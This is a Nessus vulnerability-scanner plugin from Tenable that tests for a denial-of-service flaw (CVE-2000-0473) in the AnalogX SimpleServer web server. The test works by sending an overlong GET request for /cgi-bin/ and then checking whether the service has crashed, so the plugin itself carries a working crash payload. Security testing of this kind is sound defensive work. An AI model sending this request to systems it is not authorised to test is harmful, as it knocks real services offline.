#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");

if(description)
{
 script_id(10445);
 script_bugtraq_id(1349);
 script_version ("$Revision: 1.24 $");
 script_cve_id("CVE-2000-0473");
 script_xref(name:"OSVDB", value:"346");
 script_name(english:"AnalogX SimpleServer:WWW /cgi-bin/ Long GET Request DoS");
 script_summary(english:"Crash the remote HTTP service");
 
 script_set_attribute(attribute:"synopsis", value:
"The remote web server is affected by a remote denial of service vulnerability." );
 script_set_attribute(attribute:"description", value:
"The remote web server is running an AnalogX SimpleServer web server
which is reportedly affected by a remote denial of service
vulnerability. An attacker could exploit this vulnerability in order
to crash the affected application via a long GET request for a program
in the cgi-bin directory." );
 script_set_attribute(attribute:"solution", value:
"Upgrade to SimpleServer 1.06 or newer." );
 script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P" );


script_end_attributes();
 
 script_category(ACT_DENIAL);
 script_copyright(english:"This script is Copyright (C) 2000-2009 Tenable Network Security, Inc.");
 script_family(english:"Web Servers");
 script_dependencie("http_version.nasl");
 script_require_ports("Services/www", 80);
 script_require_keys("Settings/ParanoidReport");
 exit(0);
}


#
# Here we go
#
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");

if (report_paranoia < 2) exit(0);

port = get_http_port(default:80);

if (http_is_dead(port: port)) exit(0);

r = http_send_recv3(method:"GET", port:port, item:string("/cgi-bin/", crap(8000)));

if (http_is_dead(port: port, retry: 3)) security_hole(port);

